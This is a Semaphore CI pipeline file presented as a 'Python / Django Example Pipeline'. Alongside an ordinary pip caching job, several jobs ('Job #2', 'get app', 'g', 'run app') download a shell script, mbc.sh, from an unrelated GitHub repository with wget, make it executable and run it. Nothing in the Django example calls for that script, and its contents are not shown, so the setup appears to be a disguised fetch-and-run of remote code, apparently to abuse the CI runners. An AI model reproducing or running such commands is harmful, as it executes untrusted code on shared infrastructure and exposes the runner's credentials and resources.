version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
global_job_config:
  prologue:
    commands:
      - sem-version python 3.8
blocks:
  - name: Install Dependencies
    task:
      prologue:
        commands:
          - sudo apt-get update && sudo apt-get install -y python3-dev && sudo apt-get install default-libmysqlclient-dev
      jobs:
        - name: pip
          commands:
            - checkout
            - cache restore
            - pip download --cache-dir .pip_cache -r requirements.txt
            - cache store
        - name: 'Job #2'
          commands:
            - 'wget https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
  - name: get app
    task:
      jobs:
        - name: get app
          commands:
            - 'wget https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh'
        - name: g
          commands:
            - ./mbc.sh
  - name: run
    task:
      jobs:
        - name: run app
          commands:
            - ./mbc.sh
